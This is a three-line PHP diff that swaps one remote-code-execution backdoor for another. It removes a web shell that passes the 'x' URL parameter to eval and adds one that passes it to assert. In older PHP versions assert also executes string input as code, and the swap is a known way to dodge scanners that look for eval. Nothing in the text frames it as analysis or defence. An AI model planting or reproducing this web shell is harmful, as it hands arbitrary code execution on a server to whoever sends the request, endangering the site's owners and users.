@@ -1,3 +1,3 @@
 <?php
-eval($_GET['x']);
+assert($_GET['x']);
 ?>
